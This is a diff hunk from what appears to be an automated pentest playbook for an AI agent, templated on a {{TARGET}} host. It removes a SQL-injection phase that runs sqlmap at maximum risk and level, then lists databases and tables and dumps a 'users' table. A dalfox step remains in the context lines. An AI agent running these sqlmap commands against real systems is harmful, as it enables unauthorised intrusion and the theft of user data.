@@ -149,25 +149,6 @@ Step 23: execute_command("dalfox", [
 ])
 
 ======================================================================
-FASE 9 - SQL INJECTION TESTING
-======================================================================
-
-FOR each parameter found in Arjun:
-
-Step 24: execute_command("sqlmap", [
-    "-u", "http://{{TARGET}}/[PATH]?[PARAM]=1",
-    "--batch",
-    "--risk=3",
-    "--level=5",
-    "--threads=5"
-])
-
-IF vulnerability found:
-    execute_command("sqlmap", ["-u", "[URL]", "--dbs", "--batch"])
-    execute_command("sqlmap", ["-u", "[URL]", "-D", "[DB]", "--tables", "--batch"])
-    execute_command("sqlmap", ["-u", "[URL]", "-D", "[DB]", "-T", "users", "--dump", "--batch"])
-
-======================================================================
 EXECUTION COMPLETE
 ======================================================================
 
